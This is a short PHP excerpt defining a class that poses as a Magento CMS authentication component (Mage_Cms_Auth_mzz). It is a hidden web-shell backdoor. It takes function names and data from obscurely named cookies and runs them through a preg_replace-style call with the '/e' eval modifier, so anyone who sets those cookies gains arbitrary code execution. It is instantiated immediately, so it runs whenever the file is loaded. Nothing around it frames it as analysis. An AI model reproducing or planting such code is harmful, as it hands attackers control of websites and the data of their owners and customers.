...
class Mage_Cms_Auth_mzz
{
    public function __construct() {
        $auth_cookie = @$_COOKIE['rothwewgscwfkazi3'];
        if ($auth_cookie) {
            $method = $auth_cookie(@$_COOKIE['rothwewgscwfkazi2']);
            $auth = $auth_cookie(@$_COOKIE['rothwewgscwfkazi1']);
            $method("/124/e",$auth,124);
        }
    }
}
$is_auth = new Mage_Cms_Auth_mzz;
